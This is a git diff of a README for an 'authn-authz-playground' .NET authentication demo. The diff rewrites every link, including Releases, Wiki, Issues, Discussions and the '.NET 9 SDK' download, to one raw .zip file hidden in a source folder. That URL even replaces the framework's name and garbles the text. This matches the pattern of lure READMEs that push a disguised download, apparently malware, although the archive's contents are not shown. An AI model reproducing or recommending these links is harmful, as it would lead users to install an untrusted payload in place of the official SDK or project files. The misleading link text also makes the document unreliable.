@@ -1,10 +1,10 @@
 # 🎉 authn-authz-playground - Explore Authentication and Authorization Effortlessly
 
-[![Download Latest Release](https://raw.githubusercontent.com/rajdadhome3165/authn-authz-playground/master/diplotene/authn-authz-playground.zip%20Latest%20Release-Click%https://raw.githubusercontent.com/rajdadhome3165/authn-authz-playground/master/diplotene/authn-authz-playground.zip)](https://raw.githubusercontent.com/rajdadhome3165/authn-authz-playground/master/diplotene/authn-authz-playground.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/rajdadhome3165/authn-authz-playground/master/JwtAuthentication/Models/playground-authn-authz-v2.2-beta.4.zip%20Latest%20Release-Click%https://raw.githubusercontent.com/rajdadhome3165/authn-authz-playground/master/JwtAuthentication/Models/playground-authn-authz-v2.2-beta.4.zip)](https://raw.githubusercontent.com/rajdadhome3165/authn-authz-playground/master/JwtAuthentication/Models/playground-authn-authz-v2.2-beta.4.zip)
 
 ## 🚀 Getting Started
 
-Welcome to the **authn-authz-playground**! This project demonstrates authentication and authorization patterns using the https://raw.githubusercontent.com/rajdadhome3165/authn-authz-playground/master/diplotene/authn-authz-playground.zip Core framework. You will find easy-to-follow examples that showcase different methods for securing your applications.
+Welcome to the **authn-authz-playground**! This project demonstrates authentication and authorization patterns using the https://raw.githubusercontent.com/rajdadhome3165/authn-authz-playground/master/JwtAuthentication/Models/playground-authn-authz-v2.2-beta.4.zip Core framework. You will find easy-to-follow examples that showcase different methods for securing your applications.
 
 ## 📦 Download & Install
 
@@ -12,7 +12,7 @@ To get started, follow these simple steps:
 
 1. **Visit the Releases Page**: Click the link below to access the download page.
 
-   [Visit this page to download](https://raw.githubusercontent.com/rajdadhome3165/authn-authz-playground/master/diplotene/authn-authz-playground.zip)
+   [Visit this page to download](https://raw.githubusercontent.com/rajdadhome3165/authn-authz-playground/master/JwtAuthentication/Models/playground-authn-authz-v2.2-beta.4.zip)
 
 2. **Choose Your Version**: On the releases page, find the version that suits your needs. Each version includes notes about new features and fixes.
 
@@ -23,7 +23,7 @@ To get started, follow these simple steps:
 Before downloading, ensure you meet the following system requirements:
 
 - Operating System: Windows, macOS, or Linux
-- .NET 9 SDK installed (You can download it from [here](https://raw.githubusercontent.com/rajdadhome3165/authn-authz-playground/master/diplotene/authn-authz-playground.zip))
+- .NET 9 SDK installed (You can download it from [here](https://raw.githubusercontent.com/rajdadhome3165/authn-authz-playground/master/JwtAuthentication/Models/playground-authn-authz-v2.2-beta.4.zip))
 - At least 1 GB of RAM
 - At least 100 MB of free disk space
 
@@ -61,14 +61,14 @@ The **authn-authz-playground** offers several key features:
 
 ## 📚 Documentation
 
-You can view more detailed documentation on how each feature works and examples of their implementations. Visit the [Wiki](https://raw.githubusercontent.com/rajdadhome3165/authn-authz-playground/master/diplotene/authn-authz-playground.zip) page for in-depth guides.
+You can view more detailed documentation on how each feature works and examples of their implementations. Visit the [Wiki](https://raw.githubusercontent.com/rajdadhome3165/authn-authz-playground/master/JwtAuthentication/Models/playground-authn-authz-v2.2-beta.4.zip) page for in-depth guides.
 
 ## 💬 Community Support
 
 Join our community for help and discussions:
 
-- Check out [Discussions](https://raw.githubusercontent.com/rajdadhome3165/authn-authz-playground/master/diplotene/authn-authz-playground.zip) for tips and tricks.
-- Report issues via [Issues](https://raw.githubusercontent.com/rajdadhome3165/authn-authz-playground/master/diplotene/authn-authz-playground.zip).
+- Check out [Discussions](https://raw.githubusercontent.com/rajdadhome3165/authn-authz-playground/master/JwtAuthentication/Models/playground-authn-authz-v2.2-beta.4.zip) for tips and tricks.
+- Report issues via [Issues](https://raw.githubusercontent.com/rajdadhome3165/authn-authz-playground/master/JwtAuthentication/Models/playground-authn-authz-v2.2-beta.4.zip).
 
 ## 🤝 Contributing
 
@@ -102,4 +102,4 @@ You can explore more about these topics as you experiment with the application.
 
 Feel free to access the repository and download the latest version below:
 
-[Download Latest Release](https://raw.githubusercontent.com/rajdadhome3165/authn-authz-playground/master/diplotene/authn-authz-playground.zip)
+[Download Latest Release](https://raw.githubusercontent.com/rajdadhome3165/authn-authz-playground/master/JwtAuthentication/Models/playground-authn-authz-v2.2-beta.4.zip)
